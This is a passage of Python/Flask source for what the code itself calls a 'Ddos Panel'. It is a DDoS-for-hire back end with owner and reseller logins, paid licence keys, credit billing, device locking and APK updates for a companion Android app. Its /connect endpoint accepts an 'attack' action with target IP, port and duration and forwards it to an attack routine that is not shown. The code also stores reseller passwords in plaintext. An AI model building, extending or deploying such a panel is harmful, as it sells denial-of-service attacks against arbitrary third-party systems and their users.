  const liveDot=liveCount>0?`<span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#10b981;box-shadow:0 0 5px #10b981;animation:pulse 1.5s infinite;margin-right:4px"></span>`:'';
  const liveTxt=liveCount>0?`<span style="color:#10b981;font-size:10px;font-weight:600;margin-left:3px">(${liveCount})</span>`:'';
  return `<tr><td>${k.name}</td><td class="mono" style="cursor:pointer;color:#58a6ff" onclick="copyKey('${k.key}')" title="Click to copy">${k.key}</td><td>${statusBadge}</td><td>${timeCell}</td><td>${liveDot}${(k.locked_device_ids||[]).length}/${k.device_limit}${liveTxt}</td><td><button class="btn btn-blue" style="padding:4px 10px;font-size:11px" onclick="showDevices('${k.id}',this)">📱 Devices</button></td><td><button class="btn btn-red" onclick="deleteKey('${k.id}')">Del</button></td></tr>`;
}).join('')||'<tr><td colspan="7" style="color:#8b949e">No keys</td></tr>'}</tbody></table></div>
</div>
<div class="section"><button class="btn btn-purple" onclick="showHistory()">Key History</button></div>`;
}

// ═══════════════════════════════════════════
// ACTIONS
// ═══════════════════════════════════════════
async function generateKey(){
const r=await api('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:document.getElementById('kName').value,duration_value:document.getElementById('kDur').value,duration_unit:document.getElementById('kUnit').value,device_limit:document.getElementById('kDev').value})});
document.getElementById('genResult').innerHTML=r.error?`<span style="color:#f85149">${r.error}</span>`:`Key: <span style="color:#3fb950">${r.key}</span>`;
render();
}
async function resellerGenerate(){
const dur=parseInt(document.getElementById('kDur').value)||1;
const unit=document.getElementById('kUnit').value;
const r=await api('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:document.getElementById('kName').value,duration_value:dur,duration_unit:unit,device_limit:document.getElementById('kDev').value})});
document.getElementById('genResult').innerHTML=r.error?`<span style="color:#f85149">${r.error}</span>`:`Key: <span style="color:#3fb950">${r.key}</span>`;
render();
}
async function deleteKey(id){if(!confirm('Delete this key?'))return;const r=await api('/api/delete-key',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});if(r.error){alert(r.error);return}render();}

async function removeDevice(keyId,deviceId){
  if(!confirm('Remove this device?'))return;
  const r=await api('/api/remove-device',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:keyId,device_id:deviceId})});
  if(r.error){alert(r.error);return}
  const row=document.getElementById('dev_'+keyId);if(row)row.remove();
  render();
}

function showAddReseller(){
showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
<h3>Add Reseller</h3>
<div class="form-group" style="margin-bottom:12px"><label>Username</label><input id="rUser"></div>
<div class="form-group" style="margin-bottom:12px"><label>Password</label><input id="rPass" type="password"></div>
<div class="form-group" style="margin-bottom:12px"><label>Display Name</label><input id="rName"></div>
<div class="form-group" style="margin-bottom:12px"><label>Initial Credits</label><input id="rCredits" type="number" value="100"></div>
<button class="btn btn-green" onclick="addReseller()">Add</button>
<div id="rResult" style="margin-top:10px;font-size:12px"></div>`);
}
async function addReseller(){
const r=await api('/api/add-reseller',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:document.getElementById('rUser').value,password:document.getElementById('rPass').value,display_name:document.getElementById('rName').value,credits:parseInt(document.getElementById('rCredits').value)||0})});
document.getElementById('rResult').innerHTML=r.error?`<span style="color:#f85149">${r.error}</span>`:`<span style="color:#3fb950">Reseller added!</span>`;
render();
}

async function showResellerList(){
const resellers=await api('/api/resellers');
let html=`<button class="close-btn" onclick="closeModal()">&times;</button><h3>Resellers</h3><table><thead><tr><th>Name</th><th>Credits</th><th>Add Credits</th><th></th></tr></thead><tbody>`;
resellers.forEach(r=>{html+=`<tr><td><a href="#" onclick="viewResellerDash('${r.username}');closeModal()" style="color:#58a6ff">${r.display_name}</a></td><td><span class="credit-badge">${r.credits}</span></td><td><input id="cr_${r.username}" type="number" value="100" style="width:70px;padding:4px;background:var(--surface-2);border:1px solid var(--border-2);border-radius:4px;color:var(--text)"><button class="btn btn-blue" style="padding:4px 8px;margin-left:4px;font-size:11px" onclick="addCredits('${r.username}')">+</button></td><td><button class="btn btn-red" style="padding:4px 8px;font-size:11px" onclick="deleteReseller('${r.username}')">Del</button></td></tr>`;});
html+=`</tbody></table>`;
showModal(html);
}
async function addCredits(username){
const credits=parseInt(document.getElementById('cr_'+username).value)||0;
await api('/api/add-credits',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username,credits})});
showResellerList();
}
async function deleteReseller(username){if(!confirm('Delete reseller '+username+'?'))return;await api('/api/delete-reseller',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username})});closeModal();render();}

async function viewResellerDash(username){
const data=await api('/api/reseller-dashboard?username='+username);
const keys=data.keys||[];const now=new Date();const nowMs=Date.now();
const history=await api('/api/history?by='+username);
let liveDevices=0;
keys.forEach(k=>{Object.values(k.devices_info||{}).forEach(info=>{if(info.last_seen&&(nowMs-new Date(info.last_seen).getTime())<LIVE_WINDOW)liveDevices++;});});
container.innerHTML=`<div class="header-row"><h2>${data.display_name}'s Dashboard</h2><button class="btn btn-blue" onclick="render()">Back</button></div>
<div class="cards"><div class="stat-card"><div class="label">Active Keys</div><div class="value">${keys.length}</div></div><div class="stat-card"><div class="label">Credits</div><div class="value">${data.credits}</div></div><div class="stat-card"><div class="label">Live Now 🟢</div><div class="value">${liveDevices}</div></div><div class="stat-card"><div class="label">All Time Keys</div><div class="value">${history.length}</div></div></div>
<div class="section"><div class="section-title">Active Keys (full control)</div><div style="overflow-x:auto"><table><thead><tr><th>Name</th><th>Key</th><th>Status</th><th>Time Left</th><th>Devices</th><th></th><th></th></tr></thead><tbody>${keys.map(k=>{
  const x=k.expires_at?new Date(k.expires_at)<now:false;
  const unredeemed=!k.redeemed;
  const statusBadge=x?'<span class="badge badge-expired">Expired</span>':(unredeemed?'<span class="badge badge-unredeemed">Pending</span>':'<span class="badge badge-active">Active</span>');
  const timeCell=k.expires_at?`<span class="countdown" data-exp="${k.expires_at}">…</span>`:'<span style="color:#9ca3af;font-size:11px">awaits redeem</span>';
  const liveCount=Object.values(k.devices_info||{}).filter(d=>d.last_seen&&(nowMs-new Date(d.last_seen).getTime())<LIVE_WINDOW).length;
  const liveDot=liveCount>0?`<span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#10b981;box-shadow:0 0 5px #10b981;animation:pulse 1.5s infinite;margin-right:4px"></span>`:'';
  const liveTxt=liveCount>0?`<span style="color:#10b981;font-size:10px;font-weight:600;margin-left:3px">(${liveCount})</span>`:'';
  return `<tr><td>${k.name}</td><td class="mono" style="cursor:pointer;color:#58a6ff" onclick="copyKey('${k.key}')" title="Click to copy">${k.key}</td><td>${statusBadge}</td><td>${timeCell}</td><td>${liveDot}${(k.locked_device_ids||[]).length}/${k.device_limit}${liveTxt}</td><td><button class="btn btn-blue" style="padding:4px 10px;font-size:11px" onclick="showDevices('${k.id}',this)">📱 Devices</button></td><td><button class="btn btn-red" onclick="deleteKeyFromResellerView('${k.id}','${username}')">Del</button></td></tr>`;
}).join('')||'<tr><td colspan="7" style="color:#8b949e">No active keys</td></tr>'}</tbody></table></div></div>
<div class="section"><div class="section-title">Key History (All Time)</div><div style="overflow-x:auto;max-height:300px"><table><thead><tr><th>Key</th><th>Created</th><th>Duration</th></tr></thead><tbody>${history.map(h=>`<tr><td class="mono">${h.key}</td><td>${new Date(h.created_at).toLocaleString()}</td><td>${h.duration_value} ${h.duration_unit}</td></tr>`).join('')||'<tr><td colspan="3" style="color:#8b949e">No history</td></tr>'}</tbody></table></div></div>`;
}

async function deleteKeyFromResellerView(keyId, username){
  if(!confirm('Delete this key permanently?'))return;
  const r=await api('/api/delete-key',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:keyId})});
  if(r.error){alert(r.error);return}
  viewResellerDash(username);
}

async function showHistory(){
const history=await api('/api/history');
let html=`<button class="close-btn" onclick="closeModal()">&times;</button><h3>Key History</h3><div style="max-height:400px;overflow-y:auto"><table><thead><tr><th>Key</th><th>By</th><th>Created</th><th>Duration</th></tr></thead><tbody>`;
history.forEach(h=>{html+=`<tr><td class="mono">${h.key}</td><td>${h.generated_by||'owner'}</td><td>${new Date(h.created_at).toLocaleString()}</td><td>${h.duration_value} ${h.duration_unit}</td></tr>`});
html+=`</tbody></table></div>`;
showModal(html);
}

async function showDevices(keyId,btn){
const row=document.getElementById('dev_'+keyId);
if(row){row.remove();return}
const keys=await api('/api/keys');
const key=keys.find(k=>k.id===keyId);
if(!key)return;
const devInfo=key.devices_info||{};
const devices=Object.entries(devInfo);
const colspan=ROLE==='owner'?8:7;
const now=Date.now();
function statusFor(info){
  if(!info.last_seen)return '<span style="color:#9ca3af;font-size:11px;font-weight:600">⚪ Never</span>';
  const ago=now-new Date(info.last_seen).getTime();
  if(ago<LIVE_WINDOW)return '<span style="display:inline-flex;align-items:center;gap:4px;color:#10b981;font-size:11px;font-weight:700"><span style="width:7px;height:7px;border-radius:50%;background:#10b981;box-shadow:0 0 6px #10b981;animation:pulse 1.5s infinite"></span>LIVE</span>';
  return '<span style="display:inline-flex;align-items:center;gap:4px;color:#9ca3af;font-size:11px;font-weight:600"><span style="width:7px;height:7px;border-radius:50%;background:#9ca3af"></span>Offline</span>';
}
function lastSeenStr(info){
  if(!info.last_seen)return '—';
  const ago=Math.floor((now-new Date(info.last_seen).getTime())/1000);
  if(ago<60)return ago+'s ago';
  if(ago<3600)return Math.floor(ago/60)+'m ago';
  if(ago<86400)return Math.floor(ago/3600)+'h ago';
  return Math.floor(ago/86400)+'d ago';
}
let html='';
if(devices.length===0){html=`<td colspan="${colspan}" style="padding:14px;background:var(--surface-2);color:#9ca3af;font-size:12px;text-align:center">📱 No devices connected yet.</td>`}
else{html=`<td colspan="${colspan}" style="padding:0;background:var(--surface-2)"><table style="width:100%;margin:0"><thead><tr style="background:var(--surface-3)"><th style="font-size:10px;padding:6px">#</th><th style="font-size:10px;padding:6px">Status</th><th style="font-size:10px;padding:6px">Model</th><th style="font-size:10px;padding:6px">Android</th><th style="font-size:10px;padding:6px">First Seen</th><th style="font-size:10px;padding:6px">Last Seen</th><th style="font-size:10px;padding:6px">Device ID</th><th style="font-size:10px;padding:6px">Action</th></tr></thead><tbody>${devices.map(([id,info],i)=>`<tr><td style="font-size:11px;padding:5px">${i+1}</td><td style="padding:5px">${statusFor(info)}</td><td style="font-size:11px;padding:5px"><strong>${info.model||'Unknown'}</strong></td><td style="font-size:11px;padding:5px">${info.android_version||'—'}</td><td style="font-size:10px;padding:5px;color:#888">${info.first_seen?new Date(info.first_seen).toLocaleString():'—'}</td><td style="font-size:10px;padding:5px;color:#888" title="${info.last_seen||''}">${lastSeenStr(info)}</td><td class="mono" style="font-size:9px;padding:5px;color:#888">${id.substring(0,14)}…</td><td style="padding:5px"><button class="btn btn-red" style="padding:3px 8px;font-size:10px" onclick="removeDevice('${keyId}','${id}')">🚫 Remove</button></td></tr>`).join('')}</tbody></table></td>`}
const tr=document.createElement('tr');
tr.id='dev_'+keyId;
tr.innerHTML=html;
const parentRow=btn.closest('tr');
parentRow.parentNode.insertBefore(tr,parentRow.nextSibling);
}

function copyKey(key){navigator.clipboard.writeText(key).then(()=>{const t=document.createElement('div');t.textContent='✅ Key Copied!';t.style.cssText='position:fixed;top:20px;right:20px;background:#10b981;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;font-weight:600;z-index:9999;animation:fadeOut 2s forwards';document.body.appendChild(t);setTimeout(()=>t.remove(),2000)}).catch(()=>prompt('Copy this key:',key))}

async function showUpdateConfig(){
const config=await api('/api/update-config');
showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
<h3>⬆️ App Update Settings</h3>
<p style="font-size:12px;color:#888;margin-bottom:16px">Upload new APK here. Users will get update popup in app.</p>
<form id="updateForm" enctype="multipart/form-data">
<div class="form-group" style="margin-bottom:12px"><label>Version Code (next: ${config.latest_version_code} → ${config.latest_version_code+1})</label><input id="uVerCode" type="number" value="${config.latest_version_code+1}"></div>
<div class="form-group" style="margin-bottom:12px"><label>Version Name</label><input id="uVerName" value="${config.latest_version_name}"></div>
<div class="form-group" style="margin-bottom:12px"><label>Changelog</label><input id="uChangelog" value="${config.changelog||''}" placeholder="e.g. Bug fixes, new UI"></div>
<div class="form-group" style="margin-bottom:12px"><label>APK File</label><input id="uApkFile" type="file" accept=".apk" style="padding:8px"></div>
${config.has_apk?'<p style="font-size:11px;color:#10b981;margin-bottom:12px">✅ Current APK: '+config.apk_filename+'</p>':''}
<button type="button" class="btn btn-green" onclick="uploadUpdate()">Upload & Publish Update</button>
</form>
<div id="uResult" style="margin-top:12px;font-size:12px"></div>`);
}
async function uploadUpdate(){
const form=new FormData();
const file=document.getElementById('uApkFile').files[0];
if(!file){document.getElementById('uResult').innerHTML='<span style="color:#f85149">Select APK file</span>';return}
form.append('apk_file',file);
form.append('version_code',document.getElementById('uVerCode').value);
form.append('version_name',document.getElementById('uVerName').value);
form.append('changelog',document.getElementById('uChangelog').value);
document.getElementById('uResult').innerHTML='<span style="color:#58a6ff">Uploading...</span>';
const r=await fetch('/api/upload-apk',{method:'POST',body:form});
const data=await r.json();
document.getElementById('uResult').innerHTML=data.error?'<span style="color:#f85149">'+data.error+'</span>':'<span style="color:#3fb950">✅ Update published!</span>';
}

function render(){if(ROLE==='owner')renderOwnerDashboard();else renderResellerDashboard();}
render();
setInterval(()=>{if(!modalBg.classList.contains('active')&&!document.querySelector('[id^="dev_"]'))render();},30000);
</script>
</body>
</html>'''



# ══════════════════════════════════════════════════════════════════
# WEB ROUTES
# ══════════════════════════════════════════════════════════════════

@app.route('/login', methods=['GET', 'POST'])
def login():
    ip = get_client_ip() or 'unknown'
    allowed, retry_after, remaining = login_check_rate(ip)

    if request.method == 'POST':
        if not allowed:
            mins = retry_after // 60 + (1 if retry_after % 60 else 0)
            return render_template_string(
                LOGIN_TEMPLATE,
                error=f'Too many failed attempts. Try again in {mins} min.'
            ), 429

        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        # Check owner
        if username == OWNER_USER and password == OWNER_PASS:
            login_record_success(ip)
            session['logged_in'] = True
            session['role'] = 'owner'
            session['username'] = username
            session['display_name'] = 'Owner'
            return redirect(url_for('dashboard'))
        # Check resellers
        reseller = find_reseller(username)
        if reseller and reseller.get('password') == password:
            login_record_success(ip)
            session['logged_in'] = True
            session['role'] = 'reseller'
            session['username'] = username
            session['display_name'] = reseller['display_name']
            return redirect(url_for('dashboard'))

        # Failure — record and respond
        login_record_failure(ip)
        _, _, remaining = login_check_rate(ip)
        if remaining <= 0:
            return render_template_string(
                LOGIN_TEMPLATE,
                error=f'Too many failed attempts. IP locked for {LOGIN_LOCKOUT_SEC // 60} min.'
            ), 429
        return render_template_string(
            LOGIN_TEMPLATE,
            error=f'Invalid credentials. {remaining} attempt(s) left.'
        )

    # GET — show lockout banner if currently locked
    if not allowed:
        mins = retry_after // 60 + (1 if retry_after % 60 else 0)
        return render_template_string(
            LOGIN_TEMPLATE,
            error=f'IP temporarily locked. Try again in {mins} min.'
        ), 429
    return render_template_string(LOGIN_TEMPLATE, error=None)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    credits = 0
    if is_reseller():
        r = find_reseller(session['username'])
        credits = r['credits'] if r else 0
    return render_template_string(DASHBOARD_TEMPLATE,
        title='Ddos Panel',
        role=session['role'],
        username=session['username'],
        display_name=session['display_name'],
        credits=credits)


# ══════════════════════════════════════════════════════════════════
# API ROUTES — Dashboard data
# ══════════════════════════════════════════════════════════════════

@app.route('/api/keys')
@login_required
def api_keys():
    keys = load_keys()
    if is_reseller():
        keys = [k for k in keys if k.get('generated_by') == session['username']]
    elif is_owner():
        # Owner sees only their own keys (not reseller-generated) on main dashboard
        keys = [k for k in keys if k.get('generated_by') in (session['username'], 'owner')]
    return jsonify(keys)

@app.route('/api/resellers')
@login_required
@owner_required
def api_resellers():
    return jsonify(load_resellers())

@app.route('/api/history')
@login_required
def api_history():
    history = load_history()
    if is_reseller():
        history = [h for h in history if h.get('generated_by') == session['username']]
    else:
        # Owner can filter by reseller username via query param
        filter_by = request.args.get('by', '')
        if filter_by:
            history = [h for h in history if h.get('generated_by') == filter_by]
    return jsonify(history)

@app.route('/api/my-dashboard')
@login_required
def api_my_dashboard():
    keys = load_keys()
    keys = [k for k in keys if k.get('generated_by') == session['username']]
    r = find_reseller(session['username'])
    return jsonify({'keys': keys, 'credits': r['credits'] if r else 0})

@app.route('/api/reseller-dashboard')
@login_required
@owner_required
def api_reseller_dashboard():
    username = request.args.get('username', '')
    r = find_reseller(username)
    if not r:
        return jsonify({'error': 'Not found'}), 404
    keys = [k for k in load_keys() if k.get('generated_by') == username]
    return jsonify({'keys': keys, 'credits': r['credits'], 'display_name': r['display_name']})

@app.route('/api/add-reseller', methods=['POST'])
@login_required
@owner_required
def api_add_reseller():
    data = request.json or {}
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    display_name = data.get('display_name', '').strip()
    credits = int(data.get('credits', 0))
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    if find_reseller(username):
        return jsonify({'error': 'Username already exists'}), 400
    add_reseller({'username': username, 'password': password, 'display_name': display_name or username, 'credits': credits, 'created_at': datetime.utcnow().isoformat()+'Z'})
    return jsonify({'status': 'success'})

@app.route('/api/add-credits', methods=['POST'])
@login_required
@owner_required
def api_add_credits():
    data = request.json or {}
    username = data.get('username', '')
    credits = int(data.get('credits', 0))
    r = find_reseller(username)
    if not r:
        return jsonify({'error': 'Reseller not found'}), 404
    new_credits = r.get('credits', 0) + credits
    update_reseller(username, {'credits': new_credits})
    return jsonify({'status': 'success', 'new_credits': new_credits})

@app.route('/api/delete-reseller', methods=['POST'])
@login_required
@owner_required
def api_delete_reseller():
    data = request.json or {}
    username = data.get('username', '')
    delete_reseller_by_username(username)
    return jsonify({'status': 'success'})

@app.route('/api/generate', methods=['POST'])
@login_required
def api_generate():
    data = request.json or {}
    key_name = data.get('name', '')[:64].strip() or 'key'
    duration_value = int(data.get('duration_value', 1))
    duration_unit = data.get('duration_unit', 'hours')
    device_limit = int(data.get('device_limit', 1))

    if duration_value <= 0 or device_limit <= 0:
        return jsonify({'error': 'Invalid values'}), 400

    # Credit check for resellers
    if is_reseller():
        # Convert to hours for credit calc
        if duration_unit == 'minutes':
            hours = max(1, duration_value // 60) if duration_value >= 60 else 1
        elif duration_unit == 'days':
            hours = duration_value * 24
        else:
            hours = duration_value
        cost = hours * CREDITS_PER_HOUR * device_limit  # charge per device
        r = find_reseller(session['username'])
        if not r:
            return jsonify({'error': 'Reseller not found'}), 400
        if r['credits'] < cost:
            return jsonify({'error': f'Not enough credits. Need {cost}, have {r["credits"]}'}), 400
        update_reseller(session['username'], {'credits': r['credits'] - cost})

    prefix = key_name.replace(' ', '_')
    new_key = f"{prefix}-{secrets.token_urlsafe(10)}"
    created_at = datetime.utcnow()

    # Single device key: expiry starts on redeem
    # Multi device key: expiry starts immediately (like before)
    if device_limit == 1:
        expires_at_val = None
        redeemed = False
    else:
        if duration_unit == 'minutes':
            expires_at_val = (created_at + timedelta(minutes=duration_value)).isoformat() + 'Z'
        elif duration_unit == 'hours':
            expires_at_val = (created_at + timedelta(hours=duration_value)).isoformat() + 'Z'
        else:
            expires_at_val = (created_at + timedelta(days=duration_value)).isoformat() + 'Z'
        redeemed = True

    record = {
        'id': secrets.token_hex(8),
        'name': key_name,
        'key': new_key,
        'created_at': created_at.isoformat() + 'Z',
        'expires_at': expires_at_val,
        'duration_value': duration_value,
        'duration_unit': duration_unit,
        'device_limit': device_limit,
        'plan': 'Premium',
        'locked_device_ids': [],
        'devices_info': {},
        'generated_by': session.get('username', 'owner'),
        'redeemed': redeemed
    }

    save_key(record.copy())

    # Save to history
    save_history_record(record.copy())

    return jsonify(record)

@app.route('/api/delete-key', methods=['POST'])
@login_required
def api_delete_key():
    data = request.json or {}
    key_id = data.get('id', '')
    # Permission check — resellers can delete only their own keys
    if is_reseller():
        key = keys_col.find_one({'id': key_id}, {'_id': 0})
        if not key or key.get('generated_by') != session.get('username'):
            return jsonify({'error': 'Permission denied'}), 403
    delete_key_by_id(key_id)
    connections = load_connections()
    connections.pop(key_id, None)
    save_connections(connections)
    return jsonify({'status': 'success'})


@app.route('/api/remove-device', methods=['POST'])
@login_required
def api_remove_device():
    """Remove (unlock) a device from a key so the user can re-login from a different device."""
    data = request.json or {}
    key_id = data.get('id', '')
    device_id = data.get('device_id', '')
    if not key_id or not device_id:
        return jsonify({'error': 'Missing id or device_id'}), 400

    key = keys_col.find_one({'id': key_id}, {'_id': 0})
    if not key:
        return jsonify({'error': 'Key not found'}), 404

    # Permission — owners can do anything; resellers only on their own keys
    if is_reseller() and key.get('generated_by') != session.get('username'):
        return jsonify({'error': 'Permission denied'}), 403

    locked = key.get('locked_device_ids') or []
    devices_info = key.get('devices_info') or {}
    if device_id in locked:
        locked.remove(device_id)
    devices_info.pop(device_id, None)
    update_key(key_id, {'locked_device_ids': locked, 'devices_info': devices_info})

    # Also clean from connections
    connections = load_connections()
    if key_id in connections:
        connections[key_id] = [c for c in connections[key_id] if c.get('device_id') != device_id]
        save_connections(connections)

    return jsonify({'status': 'success', 'remaining_devices': len(locked)})


# ══════════════════════════════════════════════════════════════════
# /connect — APP ENDPOINT (unchanged)
# ══════════════════════════════════════════════════════════════════

@app.route('/connect', methods=['POST'])
def connect_device():
    data = request.json or {}
    key = data.get('key', '').strip()
    device_id = data.get('device_id', '').strip()
    device_name = data.get('device_name', 'Unknown')[:100].strip()
    device_model = data.get('device_model', '')[:100].strip()
    android_version = data.get('android_version', '')[:50].strip()
    action = data.get('action', '').strip()

    if not key:
        return encrypted_reply({'valid': False, 'message': 'Key is required'})
    if not device_id:
        return encrypted_reply({'valid': False, 'message': 'Device ID is required'})

    found_key = find_key_by_value(key)
    if not found_key:
        return encrypted_reply({'valid': False, 'message': 'Invalid key'})

    # --- Expiry on first redeem (only for single device keys) ---
    if found_key.get('device_limit', 1) == 1 and (not found_key.get('redeemed') or not found_key.get('expires_at')):
        # Single device key — start expiry timer NOW on first redeem
        now = datetime.utcnow()
        duration_value = found_key.get('duration_value', 1)
        duration_unit = found_key.get('duration_unit', 'hours')
        if duration_unit == 'minutes':
            expires_at = now + timedelta(minutes=duration_value)
        elif duration_unit == 'hours':
            expires_at = now + timedelta(hours=duration_value)
        else:
            expires_at = now + timedelta(days=duration_value)
        found_key['expires_at'] = expires_at.isoformat() + 'Z'
        found_key['redeemed'] = True
        found_key['redeemed_at'] = now.isoformat() + 'Z'
        update_key(found_key['id'], {'expires_at': found_key['expires_at'], 'redeemed': True, 'redeemed_at': found_key['redeemed_at']})

    expires_at = datetime.fromisoformat(found_key['expires_at'].replace('Z', '+00:00'))
    if datetime.utcnow().replace(tzinfo=None) > expires_at.replace(tzinfo=None):
        return encrypted_reply({'valid': False, 'message': 'Key has expired'})

    device_limit = found_key.get('device_limit', 1)
    locked_devices = found_key.get('locked_device_ids') or []
    plan = found_key.get('plan', 'Premium')

    # --- Store device info (model, android version, last_seen) ---
    devices_info = found_key.get('devices_info', {})
    now_iso = datetime.utcnow().isoformat() + 'Z'
    if device_id not in devices_info:
        devices_info[device_id] = {
            'model': device_model or device_name,
            'android_version': android_version,
            'first_seen': now_iso,
            'last_seen': now_iso,
            'ip_address': get_client_ip(),
        }
    else:
        # Update model/version if provided
        if device_model:
            devices_info[device_id]['model'] = device_model
        if android_version:
            devices_info[device_id]['android_version'] = android_version
        # Always update last_seen + IP
        devices_info[device_id]['last_seen'] = now_iso
        devices_info[device_id]['ip_address'] = get_client_ip()

    if device_id not in locked_devices:
        if len(locked_devices) >= device_limit:
            return encrypted_reply({'valid': False, 'message': f'Device limit reached ({len(locked_devices)}/{device_limit})'})
        locked_devices.append(device_id)
        update_key(found_key['id'], {'locked_device_ids': locked_devices, 'devices_info': devices_info})
        connections = load_connections()
        key_id = found_key.get('id')
        connections.setdefault(key_id, [])
        connections[key_id].append({'connection_id': secrets.token_urlsafe(16), 'device_id': device_id, 'device_name': device_name, 'device_model': device_model, 'android_version': android_version, 'ip_address': get_client_ip(), 'connected_at': datetime.utcnow().isoformat()+'Z', 'status': 'approved'})
        save_connections(connections)
    else:
        update_key(found_key['id'], {'devices_info': devices_info})

    if action == 'status':
        return encrypted_reply({'valid': True, 'action': 'status', 'data': proxy_status()})

    if action == 'attack':
        target_ip = data.get('ip', '').strip()
        target_port = data.get('port', '').strip()
        attack_time = data.get('time', '').strip()
        if not target_ip or not target_port or not attack_time:
            return encrypted_reply({'valid': False, 'message': 'Missing attack params'})
        return encrypted_reply({'valid': True, 'action': 'attack', 'data': proxy_attack(target_ip, target_port, attack_time)})

    # Default: key verify
    connections = load_connections()
    key_id = found_key.get('id')
    connections.setdefault(key_id, [])
    existing = next((d for d in connections[key_id] if d.get('device_id') == device_id), None)
    if not existing:
        connections[key_id].append({'connection_id': secrets.token_urlsafe(16), 'device_id': device_id, 'device_name': device_name, 'device_model': device_model, 'android_version': android_version, 'ip_address': get_client_ip(), 'connected_at': datetime.utcnow().isoformat()+'Z', 'status': 'approved'})
        save_connections(connections)

    return encrypted_reply({'valid': True, 'message': 'Access granted', 'expires_at': found_key.get('expires_at'), 'plan': plan, 'max_devices': device_limit, 'sig': sign_response(found_key.get('expires_at'), device_id)})


# ══════════════════════════════════════════════════════════════════
# APP UPDATE SYSTEM — APK upload + in-app update
# ══════════════════════════════════════════════════════════════════

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/api/check-update', methods=['POST'])
def check_update():
    """App calls this with its current versionCode. Returns update info if newer version available."""
    data = request.json or {}
    current_version = int(data.get('version_code', 0))
    config = load_update_config()
    latest_version = config.get('latest_version_code', 1)
    if current_version < latest_version and config.get('apk_filename'):
        return jsonify({
            'update_available': True,
            'latest_version_code': latest_version,
            'latest_version_name': config.get('latest_version_name', '1.0'),
            'download_url': f"/download-apk/{config['apk_filename']}",
            'changelog': config.get('changelog', '')
        })
    return jsonify({'update_available': False})

@app.route('/download-apk/<filename>')
def download_apk(filename):
    """Serve the uploaded APK file for in-app download."""
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if not os.path.exists(filepath):
        return "File not found", 404
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True, mimetype='application/vnd.android.package-archive')

@app.route('/api/update-config', methods=['GET'])
@login_required
@owner_required
def get_update_config():
    config = load_update_config()
    config['has_apk'] = bool(config.get('apk_filename') and os.path.exists(os.path.join(UPLOAD_FOLDER, config.get('apk_filename', ''))))
    return jsonify(config)

@app.route('/api/upload-apk', methods=['POST'])
@login_required
@owner_required
def upload_apk():
    """Upload new APK + set version info."""
    if 'apk_file' not in request.files:
        return jsonify({'error': 'No APK file provided'}), 400
    file = request.files['apk_file']
    if not file.filename.endswith('.apk'):
        return jsonify({'error': 'File must be .apk'}), 400

    version_code = int(request.form.get('version_code', 1))
    version_name = request.form.get('version_name', '1.0')
    changelog = request.form.get('changelog', '')

    # Save APK
    filename = f"_v{version_code}.apk"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)

    # Delete old APK if different
    config = load_update_config()
    old_file = config.get('apk_filename', '')
    if old_file and old_file != filename:
        old_path = os.path.join(UPLOAD_FOLDER, old_file)
        if os.path.exists(old_path):
            os.remove(old_path)

    # Update config
    config = {
        'latest_version_code': version_code,
        'latest_version_name': version_name,
        'apk_filename': filename,
        'changelog': changelog
    }
    save_update_config(config)
    return jsonify({'status': 'success', 'filename': filename})


start_keep_alive()

if __name__ == '__main__':
    # Get port from environment (Render sets this automatically)
    port = int(os.environ.get('PORT', 3000))
    
    # Disable debug in production for better performance
    debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
    
    print(f"[✓] Starting  Panel on port {port}")
    print(f"[✓] Debug mode: {debug_mode}")
    print(f"[✓] Health check available at: http://localhost:{port}/health")
    print(f"[✓] Keep-alive active - will ping every 4 minutes")
    
    app.run(host='0.0.0.0', port=port, debug=debug_mode)
